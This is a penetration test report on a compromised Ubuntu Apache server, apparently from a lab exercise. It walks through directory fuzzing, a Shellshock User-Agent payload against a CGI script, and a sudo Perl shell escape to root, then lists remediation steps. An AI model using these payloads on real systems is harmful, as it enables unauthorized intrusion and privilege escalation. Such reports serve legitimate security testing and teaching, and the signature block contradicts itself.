
---

# PENETRATION TEST REPORT

**Date:** May 23, 2024
**Target:** Ubuntu Web Server (Apache)
**Severity:** CRITICAL
**Status:** System Fully Compromised (Root Access Obtained)

---

## 1. Executive Summary

During the security assessment, a **Critical** vulnerability was identified that allowed for full system compromise. The entry point was a legacy Apache CGI configuration susceptible to the **Shellshock (CVE-2014-6271)** vulnerability. This allowed for Unauthenticated Remote Code Execution (RCE) as a low-privileged user.

Subsequent post-exploitation revealed a severe **Sudo misconfiguration**, allowing the attacker to bypass all security controls and escalate privileges to the **root** user. At this stage, the attacker has complete control over the server, including the ability to exfiltrate data, modify system files, and pivot into the internal network.

---

## 2. Technical Walkthrough

### Step 1: Reconnaissance & Enumeration
Initial port scanning and service discovery identified the following open ports:
*   **Port 80 (HTTP):** Apache 2.4.18 (Running on Ubuntu).
*   **Port 22 (SSH):** OpenSSH 7.2p2.

To identify hidden assets, directory brute-forcing was performed using `ffuf`:
**Command:**
```bash
ffuf -u http://[IP]/cgi-bin/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .sh, .cgi
```
**Result:** A shell script was discovered at `/cgi-bin/user.sh`. Scripts located in `cgi-bin` are high-priority targets for Shellshock testing.

### Step 2: Exploitation (Initial Access - Shellshock)
The `user.sh` script was found to be vulnerable to **CVE-2014-6271 (Shellshock)**. The vulnerability exists in how the Bash interpreter processes trailing functions in environment variables passed via HTTP headers.

**Vector:** Injecting a malicious function into the `User-Agent` header.
**Exploit Proof of Concept:**
```bash
curl -H "User-Agent: () { :; }; echo; /usr/bin/id" http://[IP]/cgi-bin/user.sh
```
**Result:** The server executed the `id` command, returning `uid=1001(shelly)`. A stable reverse shell was subsequently established to provide interactive command-line access.

### Step 3: Privilege Escalation (PrivEsc)
After stabilizing the shell as the user `shelly`, a local security audit was performed. Checking sudo permissions revealed a critical configuration flaw.

**Command:** `sudo -l`
**Output:** `(root) NOPASSWD: /usr/bin/perl`

The user `shelly` is permitted to run the Perl interpreter as `root` without providing a password. Leveraging a known **GTFOBins** technique, I performed a "shell escape" to gain administrative access.

**Exploit:**
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
```
**Result:** **Root shell obtained.** Full administrative control confirmed.

---

## 3. Vulnerability Summary

| Vulnerability Name | Risk Level | Description |
| :--- | :--- | :--- |
| **Shellshock (RCE)** | **CRITICAL** | CVE-2014-6271 allows remote attackers to execute arbitrary commands via crafted environment variables. |
| **Sudo Misconfiguration** | **HIGH** | The `NOPASSWD` directive for the Perl binary allows any user to execute arbitrary system commands as root. |
| **Outdated Software** | **MEDIUM** | The server runs an EOL (End of Life) version of Ubuntu (16.04) and outdated service versions. |

---

## 4. Remediation Recommendations

### 1. Immediate Patching (Priority: Critical)
*   Update **Bash** to the latest version across all systems to mitigate Shellshock.
*   Update **Apache HTTP Server** to the latest stable version.
*   The underlying OS (Ubuntu 16.04) is no longer supported. Plan a migration to **Ubuntu 22.04 LTS** or **24.04 LTS** immediately.

### 2. Secure CGI Configuration
*   Audit the `/cgi-bin/` directory. Remove any scripts that are not strictly necessary for business operations.
*   If CGI functionality is not required, disable `mod_cgi` in the Apache configuration.

### 3. Enforce the Principle of Least Privilege
*   Modify the `/etc/sudoers` file. Remove the `NOPASSWD` entry for `/usr/bin/perl`.
*   Avoid granting `sudo` access to binaries that possess "shell escape" capabilities (e.g., Perl, Python, Less, Vim). If a user requires specific administrative tasks, limit `sudo` to specific, non-interactive scripts.

### 4. Implementation of WAF
*   Deploy a **Web Application Firewall (WAF)** with rulesets designed to detect and block common RCE patterns, specifically targeting function definitions in HTTP headers (`() { :; };`).

---
**Report compiled by:**
*Senior Cybersecurity Consultant*
*20+ Years Experience | CISSP, OSCP, OSCE*Junior Penetration tester
Kudriavtsev Oleksii